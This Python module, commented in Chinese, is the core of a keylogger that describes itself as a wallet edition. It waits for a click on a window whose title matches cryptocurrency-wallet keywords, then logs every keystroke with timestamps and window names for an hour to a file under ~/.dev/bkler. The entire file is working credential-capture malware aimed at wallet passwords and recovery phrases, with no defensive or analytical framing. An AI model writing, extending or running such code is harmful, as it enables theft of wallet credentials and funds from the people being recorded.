# -*- coding: utf-8 -*-
"""
键盘记录器核心模块 - 钱包扩展版本
"""

import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from pynput.keyboard import Key, KeyCode
from pynput import mouse, keyboard

from .detectors import get_active_window_name, is_wallet_window

# 记录时长（秒）
RECORDING_DURATION = 60 * 60  # 60分钟


class KeyLogger:
    """钱包键盘记录器"""

    def __init__(self, log_file: Path, duration: int = RECORDING_DURATION):
        self.log_file = log_file
        self.duration = duration
        self.keyboard_listener = None
        self.mouse_listener = None

        # 记录状态
        self.is_recording = False
        self.recording_start_time = 0
        self.recording_timer = None
        self._lock = threading.Lock()

    def format_key(self, key) -> str:
        """格式化按键为可读字符串"""
        if isinstance(key, KeyCode):
            return key.char if key.char is not None else f"[{key.name}]"
        elif isinstance(key, Key):
            key_names = {
                Key.space: " ",
                Key.enter: "[Enter]",
                Key.tab: "[Tab]",
                Key.backspace: "[Backspace]",
                Key.delete: "[Delete]",
                Key.esc: "[Esc]",
                Key.up: "[Up]",
                Key.down: "[Down]",
                Key.left: "[Left]",
                Key.right: "[Right]",
                Key.shift: "[Shift]",
                Key.shift_l: "[Shift]",
                Key.shift_r: "[Shift]",
                Key.ctrl: "[Ctrl]",
                Key.ctrl_l: "[Ctrl]",
                Key.ctrl_r: "[Ctrl]",
                Key.alt: "[Alt]",
                Key.alt_l: "[Alt]",
                Key.alt_r: "[Alt]",
                Key.cmd: "[Cmd]",
                Key.caps_lock: "[CapsLock]",
                Key.home: "[Home]",
                Key.end: "[End]",
                Key.page_up: "[PageUp]",
                Key.page_down: "[PageDown]",
                Key.f1: "[F1]", Key.f2: "[F2]", Key.f3: "[F3]", Key.f4: "[F4]",
                Key.f5: "[F5]", Key.f6: "[F6]", Key.f7: "[F7]", Key.f8: "[F8]",
                Key.f9: "[F9]", Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
            }
            return key_names.get(key, f"[{key.name}]")
        return str(key)

    def on_press(self, key):
        """键盘按下事件"""
        with self._lock:
            if not self.is_recording:
                return

        window_name = get_active_window_name() or "Unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = self.format_key(key)

        log_line = f"[{timestamp}] [{window_name}] {key_str}\n"

        # 写入日志文件
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_line)
                f.flush()
        except Exception as e:
            print(f"写入日志失败: {e}", file=sys.stderr)

    def on_release(self, key):
        """键盘释放事件（用于退出）"""
        # F12 退出
        if key == Key.f12:
            print("\n检测到 F12，停止记录...")
            self.stop_recording()
            return False

    def on_click(self, x, y, button, pressed):
        """鼠标点击事件"""
        if not pressed:
            return  # 只在按下时触发

        window_name = get_active_window_name()
        if window_name and is_wallet_window(window_name):
            with self._lock:
                if not self.is_recording:
                    # 开始记录
                    self.start_recording(window_name)

    def start_recording(self, trigger_window: str = None):
        """开始记录"""
        with self._lock:
            if self.is_recording:
                return

            self.is_recording = True
            self.recording_start_time = time.time()

        if trigger_window:
            print(f"\n>>> 检测到钱包窗口: {trigger_window}")
        print(f">>> 开始记录，将持续 {self.duration // 60} 分钟")
        print(f">>> 日志将写入: {self.log_file}")

        # 启动计时器
        self.recording_timer = threading.Timer(self.duration, self.stop_recording)
        self.recording_timer.start()

        # 写入记录开始标记
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"\n# --- 记录开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                f.write(f"# 触发窗口: {trigger_window or 'Unknown'}\n")
        except Exception as e:
            print(f"写入日志失败: {e}", file=sys.stderr)

    def stop_recording(self):
        """停止记录"""
        with self._lock:
            if not self.is_recording:
                return

            self.is_recording = False

        # 取消计时器
        if self.recording_timer:
            self.recording_timer.cancel()
            self.recording_timer = None

        # 写入记录结束标记
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"# --- 记录结束: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n\n")
        except Exception:
            pass

        print(f"\n>>> 记录已停止 ({datetime.now().strftime('%H:%M:%S')})")
        print(">>> 等待下次点击钱包窗口触发记录...\n")

    def start(self):
        """启动监听"""
        print(f"钱包键盘记录器已启动")
        print(f"日志文件: {self.log_file}")
        print(f"平台: {self.platform_info()}")
        print(f"记录时长: {self.duration // 60} 分钟\n")

        from .detectors import WALLET_PATTERNS
        print(f"监控钱包关键词: {', '.join(WALLET_PATTERNS)}")
        print("等待点击钱包窗口触发记录...")
        print("按 F12 停止程序\n")

        # 启动键盘监听
        self.keyboard_listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )

        # 启动鼠标监听
        self.mouse_listener = mouse.Listener(
            on_click=self.on_click
        )

        self.keyboard_listener.start()
        self.mouse_listener.start()

        try:
            self.keyboard_listener.join()
            self.mouse_listener.join()
        except KeyboardInterrupt:
            print("\n\n已停止")
        finally:
            self.stop_recording()

    @staticmethod
    def platform_info() -> str:
        """获取平台信息"""
        import platform
        return f"{platform.system()} {platform.release()}"


def create_log_file(log_dir: Path = None) -> Path:
    """
    创建日志文件

    Args:
        log_dir: 日志目录，默认为 ~/.dev/bkler

    Returns:
        日志文件路径
    """
    if log_dir is None:
        log_dir = Path.home() / ".dev" / "bkler"

    log_dir.mkdir(parents=True, exist_ok=True)

    # 生成日志文件名（带日期）
    date_str = datetime.now().strftime("%Y%m%d")
    log_file = log_dir / f"recording_{date_str}.log"

    # 写入日志头部
    import platform
    try:
        if not log_file.exists():
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(f"# 钱包键盘记录日志\n")
                f.write(f"# 创建时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# 平台: {platform.system()} {platform.release()}\n")
                f.write(f"# 日志格式: [时间] [窗口名称] 按键内容\n")
                f.write(f"# {'=' * 60}\n\n")
    except Exception as e:
        print(f"无法创建日志文件: {e}", file=sys.stderr)
        raise

    return log_file
